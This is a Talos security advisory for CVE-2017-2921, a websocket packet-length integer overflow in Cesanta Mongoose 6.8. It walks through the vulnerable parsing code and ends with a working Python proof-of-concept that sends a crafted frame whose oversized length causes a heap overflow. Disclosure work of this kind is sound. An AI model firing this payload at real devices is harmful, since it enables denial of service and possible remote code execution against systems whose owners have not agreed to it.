# Talos Vulnerability Report

### TALOS-2017-0428

## Cesanta Mongoose Websocket Protocol Packet Length Code Execution Vulnerability

##### October 31, 2017

##### CVE Number

CVE-2017-2921

### Summary

An exploitable memory corruption vulnerability exists in the Websocket protocol implementation of Cesanta Mongoose 6.8. A specially crafted websocket packet can cause an integer overflow resulting leading to heap buffer overflow resulting in denial of service and potential remote code execution. An attacker needs to send a specially crafted websocket packet over network to trigger this vulnerability.

### Tested Versions

Cesanta Mongoose 6.8

### Product URLs

<https://cesanta.com/>

### CVSSv3 Score

8.1 - CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H

### CWE

CWE-190: Integer Overflow or Wraparound

### Details

Mongoose is a monolithic library implementing a number of networking protocols, including HTTP, MQTT, MDNS and others. Its HTTP implementation includes upgrade support required for websocket applications. It is designed with embedded devices in mind and as such is used in many IoT devices and runs on virtually all platforms.

After the initial websocket handshake and while parsing a websocket packet, an integer overflow involving header length and packet size can occur. Insufficient checks after the potential overflow can later lead to very large memory overwrite which can result in heap memory corruption, process crash and potentially in remote code execution.

```
Function `mg_deliver_websocket_data` is responsible for parsing the websocket packet. Relevant code is:

uint64_t i, data_len = 0, frame_len = 0, buf_len = nc->recv_mbuf.len, len,                  [1]
           mask_len = 0, header_len = 0;
  ...
 if (buf_len >= 2)
 ...
   else if (buf_len >= 10 + mask_len)
   header_len = 10 + mask_len;                                                            [2]
   data_len = (((uint64_t) ntohl(*(uint32_t *) &buf[2])) << 32) +                         [3]
              ntohl(*(uint32_t *) &buf[6]);

frame_len = header_len + data_len;                                                         [4]
 ok = frame_len > 0 && frame_len <= buf_len;                                                [5]

 if (ok)
   ...
   /* Apply mask if necessary */
   if (mask_len > 0) {
     for (i = 0; i < data_len; i++)
       buf[i + header_len] ^= (buf + header_len - mask_len)[i % 4];                         [6]

```

In the above code, we can see at [1] local variables `frame_len`, `header_len` and `data_len` being declared as 64bit unsigned integers. At [2] header length is calculated since websocket protocol specifies variable length headers. At [3], 8 bytes from the packet are used as `data_len` directly. At [4], total `frame_len` is calculated and at [5] basic sanity checks are performed. If everything is ok, and the packet has mask bit set, at [6] all the data in the buffer is XORed with 4 byte mask.

An insufficient check above at [5] can allow for an integer overflow to pass undetected. In case `data_len`is a very large value, adding `header_len` to it can lead to integer wraparound , resulting in small `frame_len` value. Small `frame_len` value passes `frame_len <= buf_len` check, while `data_len` is still huge and bigger than the actual buffer size. This results in a large heap overflow at [6] as the for loop is bounded by `data_len` only.

This causes the process to crash, leading to denial of service and in some cases potentially to remote code execution.

### Exploit Proof-of-Concept

```
import socket
import struct
import sys
http_upgrade = ('GET /chat HTTP/1.1\r\n'
              'Host: server.example.com\r\n'
              'Upgrade: websocket\r\n'
              'Connection: Upgrade\r\n'
              'Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==\r\n'
              'Sec-WebSocket-Protocol: chat, superchat\r\n'
              'Sec-WebSocket-Version: 13\r\n'
              'Origin: http://example.com\r\n\r\n')
#only HTTP "Upgrade: websocket" header matters above, the above GET request was copied verbatim from wikipedia

payload = "\x00" # FIN flag doesn't matter, opcode doesn't matter
payload += chr(0x80 | 127 ) # mask is set, payload len of 127 means next 64 bits are actual payload len
payload_len = 0xffffffffffffffff -12   #actual payload len
payload += struct.pack("!Q",payload_len)
masking_key = 0 #masking key can be anything, and would need to be a specific value in real exploit
payload += struct.pack("I",masking_key)
payload += "A"*40 #garbage to pad the packet

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1],int(sys.argv[2])))
s.send(http_upgrade)
print s.recv(1024)
s.send(payload)
print s.recv(1024)
